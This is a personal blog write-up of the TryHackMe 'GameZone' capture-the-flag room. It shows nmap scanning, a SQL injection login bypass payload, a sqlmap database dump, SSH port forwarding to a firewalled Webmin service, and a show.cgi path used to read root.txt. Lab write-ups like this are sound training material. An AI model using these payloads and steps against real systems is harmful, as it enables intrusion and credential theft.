---
title: "GameZone Writeup THM"
description: "My writeup of the TryHackMe room [GameZone](https://tryhackme.com/room/gamezone)"
date: 2023-12-28
image: https://images.unsplash.com/photo-1483335584694-fb0f729b0f9c?q=80&w=2072&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D
math:
license:
hidden: false
comments: true
draft: false
tags:
    - Linux
    - SQL Injection
categories:
    - Room
    - Easy
---

We are going to startwith a scan:

```bash
nmap <your_ip>

Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-28 10:50 EST
Nmap scan report for 10.10.108.222
Host is up (0.060s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE    SERVICE
22/tcp  open     ssh
80/tcp  open     http
259/tcp filtered esro-gen

Nmap done: 1 IP address (1 host up) scanned in 9.93 seconds
```

First of all we access the web page and see the hitman,

if you don’t know his name, just use google images.

Then we see a login page, and try using SQLi

We do this by adding `' or 1=1 — -` instead of the username

By doing this we can access the site.

Now we are going to use sqlmap to dump the entire database!

Before that we need to capture the request with burp.

You can do that just by

- activating the proxy,
- capturing the request in the game zone portal
- copy it into a txt file,
- And put it into sqlmap like that:

```bash
sqlmap -r request.txt --dbms=mysql --dump --threads=5
```

Now that we have a username and password, I am going to use ssh.

Then we will use a tool called **ss** to investigate sockets running on a host.

If we run **ss -tulpn** it will tell us what socket connections are running

| Argument | Description |
| --- | --- |
| -t | Display TCP sockets |
| -u | Display UDP sockets |
| -l | Displays only listening sockets |
| -p | Shows the process using the socket |
| -n | Doesn't resolve service names |

We see that is running a servvice on port 10000 but is filtered by the firewall.

So we go back to our machine and run **`ssh -L 10000:localhost:10000 <username>@<ip>`**

Once we are in we can open our browser and go to localhost:1000,

here we are met with a login page.

I just use the credential that we altready have and they worked.

After that we just need to use metasploit, to search the exploit and run it using the options that he wants.

I’ve tried for long enough to make it work but I didn’t succeded,

in the end I searched in Exploit DB and read what the exploit does, I found out that it just allows you to exeute arbitrary commands in the `/file/show.cgi` component

Viewing the hint I know that the flag is in root.txt, so I just had to do this:

```bash
http://localhost:10000/file/show.cgi/root/root.txt
```
